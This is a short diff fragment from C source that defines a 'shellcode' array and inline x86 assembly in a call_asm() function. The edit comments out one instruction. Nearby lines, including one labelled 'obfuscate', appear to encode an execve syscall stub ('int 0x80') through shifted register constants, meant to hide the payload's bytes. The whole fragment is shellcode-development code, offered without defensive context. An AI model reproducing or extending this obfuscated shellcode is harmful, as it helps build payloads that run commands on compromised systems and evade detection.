@@ -43,7 +43,7 @@ char shellcode[] =
 
 void call_asm(){
   asm(
-      "mov %cs, %esp \n"
+      //"mov %cs, %esp \n"
       //"push $0x80cd0bb0 \n" //obfuscate
       "mov $0xc06685d8, %eax \n"
       "shl %eax \n"
